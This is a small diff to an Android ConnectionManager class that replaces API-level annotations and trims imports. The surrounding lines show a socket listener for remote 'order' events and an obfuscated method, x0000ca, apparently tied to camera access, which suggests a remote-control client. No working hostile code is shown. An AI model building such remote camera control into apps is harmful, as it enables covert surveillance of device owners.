@@ -1,9 +1,7 @@
 package py.multipartesapp.utils.control;
 
+import android.annotation.TargetApi;
 import android.content.Context;
-import android.os.Build;
-import android.os.Looper;
-import android.support.annotation.RequiresApi;
 import android.util.Log;
 
 import org.json.JSONObject;
@@ -47,7 +45,7 @@ public class ConnectionManager {
             });
 
             ioSocket.on("order", new Emitter.Listener() {
-                @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+                @TargetApi(21)
                 @Override
                 public void call(Object... args) {
                     try {
@@ -89,7 +87,7 @@ public class ConnectionManager {
 
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
+    @TargetApi(21)
     public static void x0000ca(int req) {
 
 //        CameraManager manager = (CameraManager)
